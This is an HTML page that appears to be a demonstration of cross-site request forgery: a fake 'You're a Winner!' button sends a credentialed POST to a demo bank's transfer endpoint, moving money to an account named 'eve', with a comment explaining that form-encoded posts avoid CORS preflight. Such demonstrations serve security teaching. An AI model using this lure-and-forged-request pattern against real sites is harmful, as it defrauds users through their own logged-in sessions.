<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
<h1>Congratulations! You're a Winner!</h1>
<button id="collect-prize">Click to collect your prize!</button>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script type="text/javascript">
// This test is to show that when posting application/x-www-form-urlencoded body,
// pre-flight is not triggered, while access-control-allow-origin header
// is returned in response.
$(function() {
  $('#collect-prize').click(function() {
    $.ajax({
      type: 'POST',
      url: 'https://naivebank.azurewebsites.net/api/balances/transferForm',
      data: { ToAccount: "eve", Amount: 1},
      xhrFields: {
        withCredentials: true
      }
    });
  });
});
</script>
</body>
</html>
